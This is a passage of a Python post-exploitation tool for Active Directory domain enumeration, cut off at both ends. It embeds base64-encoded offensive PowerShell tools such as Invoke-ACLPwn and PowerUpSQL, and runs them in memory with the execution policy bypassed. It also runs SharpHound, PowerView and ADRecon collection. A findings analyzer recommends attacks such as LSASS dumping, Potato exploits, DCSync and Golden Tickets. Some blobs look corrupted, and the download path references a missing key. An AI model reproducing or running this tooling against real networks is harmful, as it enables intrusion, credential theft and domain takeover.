3JvdXBETiIgCiAgICAgICAgICAgICAgICAkZ2xvYmFsOkdyb3VwQWRkZWQgKz0gJGdyb3VwRE4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBpZiAoJGMuVHlwZSAtZXEgJ0dyb3VwTWVtYmVyc2hpcCcpIHsKICAgICAgICAgIyBXZSBuZWVkIHRvIGFkZCBvdXJzZWxmIHRvIGEgZ3JvdXAsIHdlIGNhbiBza2lwIGZvciBub3cuCiAgICB9CgogICAgIyBTbGVlcCAwLjUgc2Vjb25kcyB0byBhdm9pZCByZXBsaWNhdGlvbiBpc3N1ZXMsIGV0YwogICAgU3RhcnQtc2xlZXAgLVNlY29uZHMgMC41Cn0KCiMgVE9ETzogZml4IHRoaXMgaW4gYSBuaWNlciB3YXkgKG1heWJlIGluIHRoZSBwd25jaGFpbikKIyBmb3Igbm93LCBqdXN0IGdldCBncm91cG1lbWJlcnNoaXAgb2YgdGhlIHVzZXIgYW5kIGNoZWNrIGlmIHdlIGhhdmUgd3JpdGVEYWNscyBwZXJtaXNzaW9ucwokY3VycldyaXRlRGFjbFBlcm0gPSBAKCkKJGdyb3VwTWVtYmVyc2hpcCA9IEdldC1Hcm91cG1lbWJlcnNoaXAgLW9iak5hbWUgJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUgLXJlY3Vyc2l2ZSAkdHJ1ZQpmb3JlYWNoICgkZyBpbiAkZ3JvdXBNZW1iZXJzaGlwKXsKICAgICRjdXJyV3JpdGVEYWNsUGVybSArPSAkd3JpdGVEQUNMRG9tYWluIHwgV2hlcmUtT2JqZWN0IHskXy5QcmluY2lwYWxOYW1lLlRvU3RyaW5nKCkuVG9Mb3dlcigpIC1saWtlICIkKCRnLk5UQWNjb3VudC5Ub0xvd2VyKCkpKiJ9Cn0KCmlmICgkY3VycldyaXRlRGFjbFBlcm0uQ291bnQgLWdlIDEpIHsKICAgIFdyaXRlLUdvb2QgJ0dvdCBXcml0ZURBQ0wgcGVybWlzc2lvbnMhJwoKICAgICMgQ2xlYXIgZXJyb3JzCiAgICAkZXJyQ291bnQgPSAkRXJyb3IuQ291bnQKCiAgICBSZXBsLVB3bgoKICAgIGlmICgkRXJyb3IuQ291bnQgLWd0ICRlcnJDb3VudCl7CiAgICAgICAgV3JpdGUtU3RhdHVzICdJdCBsb29rcyBsaWtlIHNvbWUgZXJyb3JzIG9jY3VyZWQuIElmIGl0IGlzIHJlbGF0ZWQgdG8gaW5zdWZmaWNpZW50IGFjY2VzcywgdHJ5IHJ1bm5pbmcgdGhlIHNjcmlwdCBhZ2FpbicKICAgIH0KfQoKIyBDbGVhbnVwCkludm9rZS1DbGVhbnVwCg==',  # Base64-encoded ACLPwn script
    'powerupsql': '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',  # Base64-encoded PowerUpSQL script
}

class Logger:
    """Thread-safe logger with detailed activity tracking"""
    def __init__(self, log_file="domain_enum_log.txt"):
        self.log_file = log_file
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        self._init_log()
        
    def _init_log(self):
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write("=" * 100 + "\n")
            f.write(f"Domain Enumeration Log - Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 100 + "\n\n")
    
    def log(self, activity, command="", status="INFO", error="", thread_id=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        thread_info = f"[Thread-{thread_id}]" if thread_id else "[Main]"
        log_entry = f"[{timestamp}] {thread_info} [{status}] Activity: {activity}"
        
        if command:
            log_entry += f"\n    Command: {command}"
        if error:
            log_entry += f"\n    Error: {error}"
        
        with self.lock:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + "\n")
        
        color_codes = {
            'SUCCESS': '\033[92m',
            'ERROR': '\033[91m',
            'WARN': '\033[93m',
            'INFO': '\033[94m',
            'CRITICAL': '\033[95m'
        }
        reset = '\033[0m'
        color = color_codes.get(status, '')
        print(f"{color}{thread_info} [{status}] {activity}{reset}")

class ToolIntegration:
    """Manages external tool downloads and execution"""
    def __init__(self, logger, temp_dir, in_memory_mode=False):
        self.logger = logger
        self.temp_dir = temp_dir
        self.in_memory_mode = in_memory_mode
        self.tools = {
            'powerview': {
                'resource': TOOL_RESOURCES['powerview'],
                'file': os.path.join(temp_dir, 'PowerView.ps1') if not in_memory_mode else None,
                'type': 'powershell'
            },
            'sharphound': {
                'resource': TOOL_RESOURCES['sharphound'],
                'file': os.path.join(temp_dir, 'SharpHound.zip') if not in_memory_mode else None,
                'type': 'powershell'
            },
            'adrecon': {
                'resource': TOOL_RESOURCES['adrecon'],
                'file': os.path.join(temp_dir, 'ADRecon.ps1') if not in_memory_mode else None,
                'type': 'powershell'
            },
            'invoke-aclpwn': {
                'resource': TOOL_RESOURCES['invoke-aclpwn'],
                'file': os.path.join(temp_dir, 'Invoke-ACLPwn.ps1') if not in_memory_mode else None,
                'type': 'powershell'
            },
            'powerupsql': {
                'resource': TOOL_RESOURCES['powerupsql'],
                'file': os.path.join(temp_dir, 'PowerUpSQL.ps1') if not in_memory_mode else None,
                'type': 'powershell'
            }
        }
    
    def _decode_content(self, encoded_content):
        """Decode base64 content"""
        try:
            decoded_bytes = base64.b64decode(encoded_content)
            return decoded_bytes.decode('utf-8')
        except Exception as e:
            self.logger.log("Content decoding failed", error=str(e), status="ERROR")
            return None

    def get_tool_in_memory(self, tool_name):
        """Get tool script content for in-memory execution"""
        if tool_name not in self.tools:
            self.logger.log(f"Unknown tool: {tool_name}", status="ERROR")
            return None
            
        if not self.tools[tool_name]['resource']:
            self.logger.log(f"No content available for: {tool_name}", status="ERROR")
            return None
        
        if tool_name == 'sharphound':
            # Special handling for SharpHound ZIP file
            try:
                decoded_bytes = base64.b64decode(self.tools[tool_name]['resource'])
                zip_buffer = BytesIO(decoded_bytes)
                with zipfile.ZipFile(zip_buffer, 'r') as zip_ref:
                    for name in zip_ref.namelist():
                        if name.endswith('.ps1'):
                            return zip_ref.read(name).decode('utf-8')
            except Exception as e:
                self.logger.log(f"ZIP extraction failed for {tool_name}", error=str(e), status="ERROR")
                return None
        else:
            # Regular PS1 files
            return self._decode_content(self.tools[tool_name]['resource'])

    def get_tool_path(self, tool_name):
        """Get tool file path for normal execution"""
        if not self.in_memory_mode:
            return self.tools.get(tool_name, {}).get('file', '')
        return None

    def download_tool(self, tool_name):
        """Download tool from GitHub (original fallback method for normal execution)"""
        if tool_name not in self.tools:
            self.logger.log(f"Unknown tool: {tool_name}", status="ERROR")
            return False
        
        tool_info = self.tools[tool_name]
        self.logger.log(f"Downloading {tool_name}", status="INFO")
        
        try:
            ps_download = f"""
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri '{tool_info['url']}' -OutFile '{tool_info['file']}' -UseBasicParsing
            """
            result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_download],
                                  capture_output=True, text=True, timeout=60)
            
            if os.path.exists(tool_info['file']):
                self.logger.log(f"{tool_name} downloaded successfully", status="SUCCESS")
                return True
            else:
                self.logger.log(f"Failed to download {tool_name}", error=result.stderr, status="ERROR")
                return False
        except Exception as e:
            self.logger.log(f"Download failed for {tool_name}", error=str(e), status="ERROR")
            return False

class EnumerationTask:
    """Represents a single enumeration task"""
    def __init__(self, name, function, priority=1, enabled=True):
        self.name = name
        self.function = function
        self.priority = priority
        self.enabled = enabled
        self.result = None
        self.error = None
        self.start_time = None
        self.end_time = None
    
    def execute(self, *args, **kwargs):
        """Execute the task"""
        self.start_time = datetime.now()
        try:
            self.result = self.function(*args, **kwargs)
            self.end_time = datetime.now()
            return self.result
        except Exception as e:
            self.error = str(e)
            self.end_time = datetime.now()
            raise

class DomainEnumerator:
    """Main enumeration engine with multi-threading support"""
    def __init__(self, config):
        self.config = config
        self.logger = Logger()
        self.temp_dir = tempfile.mkdtemp(prefix='domain_enum_') if not config.in_memory_mode else tempfile.mkdtemp(prefix='domain_enum_mem_')
        self.tool_integration = ToolIntegration(self.logger, self.temp_dir, in_memory_mode=config.in_memory_mode)
        
        self.results = {
            'metadata': {
                'start_time': datetime.now().isoformat(),
                'hostname': os.getenv('COMPUTERNAME', 'Unknown'),
                'username': os.getenv('USERNAME', 'Unknown')
            },
            'current_user': {},
            'local_privileges': {},
            'domain_info': {},
            'users': [],
            'computers': [],
            'groups': [],
            'shares': [],
            'gpo': [],
            'acls': [],
            'sql_instances': [],
            'bloodhound_data': {},
            'powerview_data': {},
            'adrecon_data': {},
            'aclpwn_data': {},
            'powerupsql_data': {},
            'interesting_findings': [],
            'weaknesses': []
        }
        
        self.task_queue = queue.Queue()
        self.result_lock = threading.Lock()
        
    def run_command(self, command, shell=False, powershell=False, timeout=300, thread_id="", prepend_script=""):
        """Execute command and return output with in-memory script support"""
        try:
            if powershell:
                # For in-memory mode, prepend script contents; otherwise use standard execution
                if self.config.in_memory_mode and prepend_script:
                    full_cmd = ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', prepend_script + command]
                else:
                    full_cmd = ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', command]
            else:
                full_cmd = command if isinstance(command, list) else command.split()
            
            self.logger.log(f"Executing command", command=str(full_cmd)[:200], status="INFO", thread_id=thread_id)
            result = subprocess.run(full_cmd, capture_output=True, text=True, 
                                  timeout=timeout, shell=shell)
            
            if result.returncode != 0 and result.stderr:
                self.logger.log("Command completed with warnings", error=result.stderr[:200], 
                              status="WARN", thread_id=thread_id)
            
            return result.stdout
        except subprocess.TimeoutExpired:
            self.logger.log("Command timeout", error=f"Timeout after {timeout}s", 
                          status="ERROR", thread_id=thread_id)
            return ""
        except Exception as e:
            self.logger.log("Command execution failed", error=str(e), 
                          status="ERROR", thread_id=thread_id)
            return ""
    
    def enumerate_current_user(self, thread_id=""):
        """Enumerate current user context"""
        self.logger.log("Enumerating current user context", status="INFO", thread_id=thread_id)
        
        output = self.run_command("whoami /all", thread_id=thread_id)
        priv_output = self.run_command("whoami /priv", thread_id=thread_id)
        groups_output = self.run_command("whoami /groups", thread_id=thread_id)
        
        with self.result_lock:
            self.results['current_user'] = {
                'whoami': output,
                'privileges': priv_output,
                'groups': groups_output
            }
        
        return True
    
    def enumerate_local_system(self, thread_id=""):
        """Enumerate local system information"""
        self.logger.log("Enumerating local system", status="INFO", thread_id=thread_id)
        
        systeminfo = self.run_command("systeminfo", thread_id=thread_id)
        local_users = self.run_command("net user", thread_id=thread_id)
        local_groups = self.run_command("net localgroup", thread_id=thread_id)
        admin_check = self.run_command("net session", shell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['local_privileges'] = {
                'systeminfo': systeminfo,
                'local_users': local_users,
                'local_groups': local_groups,
                'is_admin': "Access is denied" not in admin_check
            }
        
        return True
    
    def enumerate_domain_basic(self, thread_id=""):
        """Enumerate basic Active Directory domain information"""
        self.logger.log("Enumerating domain information", status="INFO", thread_id=thread_id)
        
        ps_cmd = """
        try {
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $domainInfo = @{
                Name = $domain.Name
                Forest = $domain.Forest.Name
                DomainControllers = $domain.DomainControllers | ForEach-Object { $_.Name }
            }
            $domainInfo | ConvertTo-Json
        } catch {
            Write-Output "Error: $_"
        }
        """
        domain_info = self.run_command(ps_cmd, powershell=True, thread_id=thread_id)
        
        dc_output = self.run_command("nltest /dclist:", shell=True, thread_id=thread_id)
        users_output = self.run_command("net user /domain", shell=True, thread_id=thread_id)
        computers_output = self.run_command("net group 'Domain Computers' /domain", shell=True, thread_id=thread_id)
        groups_output = self.run_command("net group /domain", shell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['domain_info']['basic'] = domain_info
            self.results['domain_info']['domain_controllers'] = dc_output
            self.results['users'] = self.parse_net_output(users_output)
            self.results['computers'] = self.parse_net_output(computers_output)
            self.results['groups'] = self.parse_net_output(groups_output)
        
        return True
    
    def enumerate_powerview(self, thread_id=""):
        """Execute PowerView enumeration with in-memory support"""
        if not self.config.powerview:
            return False
        
        self.logger.log("Running PowerView enumeration", status="INFO", thread_id=thread_id)
        
        ps_script = ""
        
        # For in-memory mode, prepend the embedded PowerView script
        if self.config.in_memory_mode:
            content = self.tool_integration.get_tool_in_memory('powerview')
            if not content:
                return False
            ps_script = content + "\n"
        else:
            # Normal execution mode
            if not self.tool_integration.download_tool('powerview'):
                return False
            ps_script = f"Import-Module '{self.tool_integration.get_tool_path('powerview')}'\n"
        
        # Add PowerView commands
        ps_script += """
        $results = @{}

        # Domain information
        $results['Domain'] = Get-Domain | Select-Object Name, Forest, DomainControllers | ConvertTo-Json

        # Domain users
        $results['DomainUsers'] = Get-DomainUser | Select-Object samaccountname, description, memberof -First 100 | ConvertTo-Json

        # Domain computers
        $results['DomainComputers'] = Get-DomainComputer | Select-Object dnshostname, operatingsystem, lastlogon -First 100 | ConvertTo-Json

        # Domain admins
        $results['DomainAdmins'] = Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName, MemberSID | ConvertTo-Json

        # Find domain shares
        $results['DomainShares'] = Find-DomainShare -CheckShareAccess | Select-Object Name, Path, Type -First 50 | ConvertTo-Json

        # Domain trusts
        $results['DomainTrusts'] = Get-DomainTrust | Select-Object SourceName, TargetName, TrustType | ConvertTo-Json

        # ACLs with interesting permissions
        $results['InterestingACLs'] = Find-InterestingDomainAcl | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier -First 50 | ConvertTo-Json

        $results | ConvertTo-Json -Depth 10
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=600, thread_id=thread_id)
        
        with self.result_lock:
            self.results['powerview_data'] = output
        
        self.logger.log("PowerView enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_sharphound(self, thread_id=""):
        """Execute SharpHound for BloodHound data collection with in-memory support"""
        if not self.config.sharphound:
            return False
        
        self.logger.log("Running SharpHound enumeration", status="INFO", thread_id=thread_id)
        
        # For in-memory mode, extract script from ZIP directly
        if self.config.in_memory_mode:
            content = self.tool_integration.get_tool_in_memory('sharphound')
            if not content:
                return False
                
            ps_script = content + "\n\n"
        else:
            # Normal execution mode
            if not self.tool_integration.download_tool('sharphound'):
                return False
            ps_script = f"Import-Module '{self.tool_integration.get_tool_path('sharphound')}'\n\n"

        output_dir = self.temp_dir
        
        ps_script += f"""
        Invoke-BloodHound -CollectionMethod 'All' -OutputDirectory '{output_dir}' -OutputPrefix 'bloodhound' -NoSaveCache
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=900, thread_id=thread_id)
        
        # Find generated zip file
        zip_files = [f for f in os.listdir(output_dir) if f.startswith('bloodhound') and f.endswith('.zip')]
        
        with self.result_lock:
            self.results['bloodhound_data'] = {
                'output': output,
                'zip_file': zip_files[0] if zip_files else None,
                'path': os.path.join(output_dir, zip_files[0]) if zip_files else None
            }
        
        self.logger.log("SharpHound enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_adrecon(self, thread_id=""):
        """Execute ADRecon enumeration with in-memory support"""
        if not self.config.adrecon:
            return False
        
        self.logger.log("Running ADRecon enumeration", status="INFO", thread_id=thread_id)
        
        # Load ADRecon script into memory or normal file
        ps_script = ""
        
        if self.config.in_memory_mode:
            content = self.tool_integration.get_tool_in_memory('adrecon')
            if not content:
                return False
            ps_script = content + "\n\n"
        else:
            if not self.tool_integration.download_tool('adrecon'):
                return False
            ps_script = f". '{self.tool_integration.get_tool_path('adrecon')}'\n\n"
        
        output_dir = os.path.join(self.temp_dir, 'ADRecon')
        
        ps_script += f"""
        Invoke-ADRecon -OutputDir '{output_dir}' -Collect 'All'
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=1200, thread_id=thread_id)
        
        with self.result_lock:
            self.results['adrecon_data'] = {
                'output': output,
                'output_dir': output_dir
            }
        
        self.logger.log("ADRecon enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_aclpwn(self, thread_id=""):
        """Execute Invoke-ACLPwn for ACL attack paths with in-memory support"""
        if not self.config.aclpwn:
            return False
        
        self.logger.log("Running Invoke-ACLPwn enumeration", status="INFO", thread_id=thread_id)
        
        # Load ACLPwn script
        ps_script = ""
        
        if self.config.in_memory_mode:
            content = self.tool_integration.get_tool_in_memory('invoke-aclpwn')
            if not content:
                return False
            ps_script = content + "\n\n"
        else:
            if not self.tool_integration.download_tool('invoke-aclpwn'):
                return False
            ps_script = f". '{self.tool_integration.get_tool_path('invoke-aclpwn')}'\n\n"
        
        ps_script += """
        $results = Find-InterestingDomainAcl | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier -First 100
        $results | ConvertTo-Json
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=600, thread_id=thread_id)
        
        with self.result_lock:
            self.results['aclpwn_data'] = output
        
        self.logger.log("Invoke-ACLPwn enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_powerupsql(self, thread_id=""):
        """Execute PowerUpSQL for SQL Server enumeration with in-memory support"""
        if not self.config.powerupsql:
            return False
        
        self.logger.log("Running PowerUpSQL enumeration", status="INFO", thread_id=thread_id)
        
        # Load PowerUpSQL script
        ps_script = ""
        
        if self.config.in_memory_mode:
            content = self.tool_integration.get_tool_in_memory('powerupsql')
            if not content:
                return False
            ps_script = content + "\n\n"
        else:
            if not self.tool_integration.download_tool('powerupsql'):
                return False
            ps_script = f"Import-Module '{self.tool_integration.get_tool_path('powerupsql')}'\n\n"
        
        ps_script += """
        $results = @{}

        # Discover SQL instances
        $results['SQLInstances'] = Get-SQLInstanceDomain | Select-Object ComputerName, Instance, DomainAccount -First 50 | ConvertTo-Json

        # Check default credentials
        $results['DefaultCreds'] = Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq 'Accessible'} | ConvertTo-Json

        $results | ConvertTo-Json -Depth 5
        """
        
        output = self.run_command(ps_script, powershell=True, timeout=600, thread_id=thread_id)
        
        with self.result_lock:
            self.results['powerupsql_data'] = output
            self.results['sql_instances'] = output
        
        self.logger.log("PowerUpSQL enumeration completed", status="SUCCESS", thread_id=thread_id)
        return True
    
    def enumerate_shares(self, thread_id=""):
        """Enumerate network shares"""
        self.logger.log("Enumerating network shares", status="INFO", thread_id=thread_id)
        
        shares_output = self.run_command("net share", thread_id=thread_id)
        
        ps_cmd = """
        try {
            Get-SmbShare | Select-Object Name, Path, Description, CurrentUsers | ConvertTo-Json
        } catch {
            Write-Output "[]"
        }
        """
        smb_shares = self.run_command(ps_cmd, powershell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['shares'].append({'type': 'local', 'data': shares_output})
            self.results['shares'].append({'type': 'smb', 'data': smb_shares})
        
        return True
    
    def enumerate_gpo(self, thread_id=""):
        """Enumerate Group Policy Objects"""
        self.logger.log("Enumerating GPOs", status="INFO", thread_id=thread_id)
        
        gpo_user = self.run_command("gpresult /r /scope:user", shell=True, thread_id=thread_id)
        gpo_computer = self.run_command("gpresult /r /scope:computer", shell=True, thread_id=thread_id)
        
        with self.result_lock:
            self.results['gpo'].append({'scope': 'user', 'data': gpo_user})
            self.results['gpo'].append({'scope': 'computer', 'data': gpo_computer})
        
        return True
    
    def analyze_weaknesses(self, thread_id=""):
        """Analyze collected data for security weaknesses"""
        self.logger.log("Analyzing for security weaknesses", status="INFO", thread_id=thread_id)
        
        findings = []
        
        # Check current user privileges
        privileges = str(self.results['current_user'].get('privileges', ''))
        
        if 'SeImpersonatePrivilege' in privileges and 'Enabled' in privileges:
            findings.append({
                'severity': 'HIGH',
                'category': 'Privilege Escalation',
                'finding': 'SeImpersonatePrivilege Enabled',
                'description': 'User has SeImpersonatePrivilege - vulnerable to Potato attacks',
                'recommendation': 'Exploit: JuicyPotato, RoguePotato, PrintSpoofer',
                'cvss': '7.8'
            })
        
        if 'SeDebugPrivilege' in privileges and 'Enabled' in privileges:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Privilege Escalation',
                'finding': 'SeDebugPrivilege Enabled',
                'description': 'User can debug any process - direct path to SYSTEM',
                'recommendation': 'Memory dump LSASS, inject into privileged processes',
                'cvss': '9.3'
            })
        
        if 'SeLoadDriverPrivilege' in privileges:
            findings.append({
                'severity': 'HIGH',
                'category': 'Privilege Escalation',
                'finding': 'SeLoadDriverPrivilege Enabled',
                'description': 'User can load kernel drivers - privilege escalation possible',
                'recommendation': 'Exploit: Capcom.sys, other vulnerable drivers',
                'cvss': '7.8'
            })
        
        # Check admin rights
        if self.results['local_privileges'].get('is_admin'):
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Access',
                'finding': 'Local Administrator Access',
                'description': 'Current user has local administrator privileges',
                'recommendation': 'Full local system compromise possible, dump credentials',
                'cvss': '9.0'
            })
        
        # Check for writable shares
        for share in self.results['shares']:
            share_str = str(share)
            if 'Everyone' in share_str or 'FULL' in share_str or 'CHANGE' in share_str:
                findings.append({
                    'severity': 'MEDIUM',
                    'category': 'Lateral Movement',
                    'finding': 'Writable Network Share',
                    'description': f'Share with weak permissions detected: {share_str[:100]}',
                    'recommendation': 'Check for write access, potential for malware deployment',
                    'cvss': '5.5'
                })
        
        # Check domain groups membership
        groups = str(self.results['current_user'].get('groups', ''))
        if 'Domain Admins' in groups:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Access',
                'finding': 'Domain Administrator Account',
                'description': 'User is member of Domain Admins group',
                'recommendation': 'Full domain compromise - DCSync, Golden Ticket attacks',
                'cvss': '10.0'
            })
        
        if 'Enterprise Admins' in groups:
            findings.append({
                'severity': 'CRITICAL',
                'category': 'Access',
                'finding': 'Enterprise Administrator Account',
                'description': 'User is member of Enterprise Admins group',
                'recommendation': 'Full forest compromise possible',
                'cvss': '10.0'
            })
        
        # Analyze PowerView data for interesting ACLs
        powerview_data = str(self.results.get('powerview_data', ''))
        if 'GenericAll' in powerview_data or 'WriteDacl' in powerview_data:
            findings.append({
                'severity': 'HIGH',
                'category': 'Privilege Escalation',
                'finding': 'Dangerous ACL Permissions',
                'description': 'User has GenericAll or WriteDacl on domain objects',
                'recommendation': 'Review PowerView output for ACL abuse paths',
                'cvss': '8.0'
            })
        
        # Check for SQL instances
        if self.results.get('sql_instances'):
            findings.append({
                'severity': 'MEDIUM',
                'category': 'Attack Surface',
                'finding': 'SQL Server Instances Discovered',
                'description': 'SQL Server instances found in domain',
                'recommendation': 'Test for default credentials, SQL injection, xp_cmdshell',
                'cvss': '6.5'
            })
        
        # Sort findings by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        findings.sort(key=lambda x: severity_order.get(x['severity'], 4))
        
        with self.result_lock:
            self.results['weaknesses'] = findings
            self.results['interesting_findings'] = [f for f in findings if f['severity'] in ['CRITICAL', 'HIGH']]
        
        self.logger.log(f"Analysis complete - {len(findings)} findings identified", 
                       status="SUCCESS", thread_id=thread_id)
        return True
    
    def parse_net_output(self, output):
